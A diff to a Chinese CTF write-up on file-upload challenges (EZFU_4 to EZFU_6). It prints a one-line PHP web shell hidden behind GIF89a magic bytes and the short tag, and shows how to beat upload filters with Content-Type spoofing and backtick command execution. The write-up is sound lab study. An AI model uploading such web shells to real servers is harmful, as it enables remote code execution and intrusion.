@@ -131,26 +131,37 @@ flag还是在phpinfo()中
 
 ![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785030991845_image.png)
 
+EZFU_4
+-
+又过滤了文件内容，经测试文件内容中不能出现 `<?php `，直接用短标签 `<?=` 绕过（需目标环境开启 short_open_tag）：
+提交1.phtml
+```
+GIF89a
+<?= eval($_POST[1]);?>
+```
+
+EZFU_5
+-
+注意这次要改文件类型`Content-Type: image/png`
+
+对php过滤了，还得用短标签
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785562235237_image.png)
+
+[参考文件](https://blog.csdn.net/qsuperm/article/details/160826553)
 
 
+EZFU_6
+-
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785562623397_image.png)
+
+发现是`eval`被过滤了,可以使用反引号，传1=env
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1785563078645_image.png)
 
 
+env 是 Linux/Unix 系统自带命令，作用：打印当前进程所有环境变量
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+`` `env ``=>
 
 
 
